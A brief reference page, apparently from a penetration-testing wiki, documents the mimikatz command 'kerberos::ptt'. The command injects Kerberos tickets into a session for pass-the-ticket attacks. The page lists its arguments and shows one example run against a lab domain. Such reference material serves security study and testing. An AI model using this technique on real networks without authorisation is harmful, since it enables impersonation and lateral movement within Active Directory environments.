# ptt

`kerberos::ptt` is used for [passing the ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) by injecting one or may Kerberos tickets in the current session. The ticket can either be a TGT (Ticket-Granting Ticket) or an ST (Service Ticket). It has the following command line arguments:

* `/filename` - the ticket's filename (can be multiple)
* `/directory` - a directory path, all `.kirbi` files inside will be injected.

```
mimikatz # kerberos::ptt 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi

* File: '0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi': OK
```
